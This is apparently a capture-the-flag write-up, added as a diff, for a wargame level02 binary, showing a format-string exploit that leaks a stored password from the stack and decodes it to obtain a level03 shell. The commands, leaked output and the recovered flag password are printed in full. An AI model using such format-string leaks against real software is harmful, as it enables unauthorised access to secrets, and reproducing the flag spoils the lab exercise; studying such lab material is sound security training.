@@ -1,0 +1,55 @@
+Program compares entered password with one that stored in .pass file.
+That meeans that flag can be found on stack, but gdb can't open .pass
+
+---> r
+    Starting program: /home/users/level02/level02 
+    ERROR: failed to open password file
+    [Inferior 1 (process 9204) exited with code 01]
+
+
+Program has a bunch of printfs, which have format string vulnerability, which we will use for early mentioned purpose
+
+$ (python -c 'print "%p " * 100') | ./level02 | grep does | tr ' ' '\n'
+    ...
+    (nil)
+    0x756e505234376848
+    0x45414a3561733951
+    0x377a7143574e6758
+    0x354a35686e475873
+    0x48336750664b394d
+    (nil)
+    ...
+
+Decoding it in string
+
+$ python
+Python 2.7.3 (default, Jun 22 2015, 19:33:41) 
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> "756e505234376848".decode("hex")
+'unPR47hH'
+>>> "45414a3561733951".decode("hex")
+'EAJ5as9Q'
+>>> "377a7143574e6758".decode("hex")
+'7zqCWNgX'
+>>> "354a35686e475873".decode("hex")
+'5J5hnGXs'
+>>> "48336750664b394d".decode("hex")
+'H3gPfK9M'
+
+$ ./level02 
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: 
+--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+*****************************************
+Greetings, !
+
+$ whoami
+level03
+$ su level03
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
